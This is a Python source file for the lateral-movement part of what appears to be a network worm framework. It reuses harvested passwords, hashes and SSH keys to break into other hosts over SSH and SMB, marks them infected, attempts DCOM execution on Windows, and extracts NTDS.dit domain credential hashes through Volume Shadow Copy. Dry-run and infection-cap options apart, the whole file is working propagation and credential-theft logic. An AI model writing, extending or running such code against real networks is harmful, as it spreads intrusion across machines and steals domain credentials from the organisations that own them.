"""Lateral movement mixin.

Restructured per phase (credential reuse -> DCOM -> VSS/NTDS): the previous
version early-returned after the first successful credential reuse, so the
DCOM and VSS/NTDS phases only ever ran when NO credential worked. It also
recorded every lateral movement twice.
"""

from typing import Dict, List

from .module_imports import logger


class WormCoreLateral:
    # Canonical service -> port mapping used to decide which techniques a
    # target exposes from its open-port list.
    SERVICE_PORTS = {
        "ssh": (22, 2222, 2200, 2022),
        "smb": (445, 139),
        "rdp": (3389,),
        "http": (80, 8080, 443),
        "jenkins": (8080,),
        "tomcat": (8080,),
        "redis": (6379,),
        "postgres": (5432,),
        "mysql": (3306,),
        "mssql": (1433,),
    }

    @classmethod
    def _get_services_for_ports(cls, ports: List[int]) -> List[str]:
        """Return the services reachable through the given open ports."""
        services = []
        for service, candidates in cls.SERVICE_PORTS.items():
            if any(port in ports for port in candidates):
                services.append(service)
        return services

    def _try_lateral_movement(self, source_ip: str, source_target: Dict):
        if not self.lateral_movement or not self.knowledge_graph:
            return

        creds_list = self.knowledge_graph.get_credentials_for_host(source_ip)
        if not creds_list and self.cred_manager:
            discovered = self.cred_manager.get_discovered_credentials()
            if discovered:
                creds_list = [
                    {"username": u, "password": p, "type": "password"} for u, p in discovered
                ]

        if not creds_list:
            return

        uninfected = self.knowledge_graph.get_uninfected_hosts()
        if not uninfected:
            return

        # ---- Phase 1: credential reuse (SSH/SMB via LateralMovementEngine) ----
        last_credentials = None
        for cred_info in creds_list[:3]:
            credentials = {
                "username": cred_info.get("username", ""),
                "password": cred_info.get("password", ""),
                "hash": cred_info.get("hash", ""),
                "ssh_key": cred_info.get("ssh_key", ""),
            }
            last_credentials = credentials

            for target_ip in uninfected[:5]:
                target_info = None
                for host in self.scan_results:
                    if host["ip"] == target_ip:
                        target_info = host
                        break

                if not target_info:
                    continue

                services = self._get_services_for_ports(target_info.get("open_ports", []))
                logger.info(
                    f"Lateral movement: {source_ip} -> {target_ip} as "
                    f"{credentials.get('username', '?')} (services: {services or 'unknown'})"
                )
                self.stats["lateral_movements"] += 1

                if self.dry_run:
                    logger.info(f"[DRY RUN] Would attempt lateral movement to {target_ip}")
                    continue

                source_host = {
                    "ip": source_ip,
                    "os_guess": source_target.get("os_guess", "Unknown"),
                }

                success, result = self.lateral_movement.move(
                    source_host, target_info, credentials=credentials
                )

                if not success:
                    continue

                self.stats["lateral_success"] += 1
                logger.success(f"Lateral movement succeeded: {source_ip} -> {target_ip}")

                # Atomic admission (kill switch + max_infections under lock).
                if self.check_and_add_infected(target_ip):
                    self.stats["infections"] += 1
                    if self.knowledge_graph:
                        self.knowledge_graph.mark_infected(
                            target_ip, result.get("technique", "lateral")
                        )
                    if self.host_monitor:
                        self.host_monitor.register_host(
                            target_ip,
                            os_guess=target_info.get("os_guess", "Unknown"),
                            ports=target_info.get("open_ports", []),
                            exploit_method=f"lateral_{result.get('technique', 'unknown')}",
                        )

                    self.real_world_agent.provide_feedback(target_info, True, 30)

                if self.host_monitor:
                    self.host_monitor.record_lateral_movement(
                        source_ip,
                        target_ip,
                        result.get("technique", "unknown"),
                        True,
                    )

        # ---- Phase 2: DCOM lateral movement (Windows source) ----
        if self.dcom_lateral:
            try:
                os_guess = source_target.get("os_guess", "").lower()
                if "windows" in os_guess:
                    dcom_credentials = last_credentials or {}
                    for target_ip in uninfected[:3]:
                        dcom_ok, dcom_result = self.dcom_lateral.move(
                            target_ip=target_ip,
                            command="whoami",
                            username=dcom_credentials.get("username"),
                            password=dcom_credentials.get("password"),
                            technique="auto",
                        )
                        if dcom_ok:
                            logger.success(f"DCOM lateral: {source_ip} -> {target_ip}")
                            if self.check_and_add_infected(target_ip):
                                self.stats["infections"] += 1
                            break
            except Exception as e:
                logger.debug(f"DCOM lateral movement failed: {e}")

        # ---- Phase 3: VSS + NTDS.dit extraction (Windows source) ----
        if self.vss_ntds:
            try:
                os_guess = source_target.get("os_guess", "").lower()
                if "windows" in os_guess:
                    logger.info(f"Extracting NTDS.dit via VSS on {source_ip}")
                    ntds_result = self.vss_ntds.run(volume="C:", cleanup=True)
                    if ntds_result.get("ntds_dumped"):
                        logger.success(f"NTDS.dit extracted from {source_ip}")
                        self.stats["credentials_discovered"] += len(ntds_result.get("hashes", []))
            except Exception as e:
                logger.debug(f"VSS NTDS extraction failed: {e}")
